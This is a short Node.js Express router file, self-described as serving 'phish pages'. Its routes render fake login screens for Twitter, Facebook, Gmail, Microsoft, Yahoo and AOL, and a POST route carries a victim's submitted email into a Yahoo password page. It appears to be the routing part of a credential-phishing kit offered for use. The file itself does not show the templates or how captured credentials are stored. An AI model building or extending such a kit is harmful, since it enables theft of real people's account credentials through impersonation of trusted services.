var express = require('express');
var router = express.Router();

/* GET phish pages. */
router.get('/', function(req, res, next) {
  res.render('twitter') // twitter
});
router.get('/facebook', function(req, res, next) {
  res.render('facebook') // facebook
});
router.get('/gmail', function(req, res, next) {
  res.render('gmail') // gmail
});
router.get('/gmail-password', function(req, res, next) {
  res.render('password') // gmail-password
});
router.get('/microsoft', function(req, res, next) {
  res.render('microsoft') // gmail-password
});
router.get('/yahoo', function(req, res, next) {
  res.render('yahoo') // gmail-password
});

router.post('/yahoo-pass', function(req, res, next) {
  const email = req.body.email;
  res.render('yahoo-pass', {'email':email}) // gmail-password
});
router.get('/aol', function(req, res, next) {
  res.render('aol') // aol-password
});
module.exports = router;
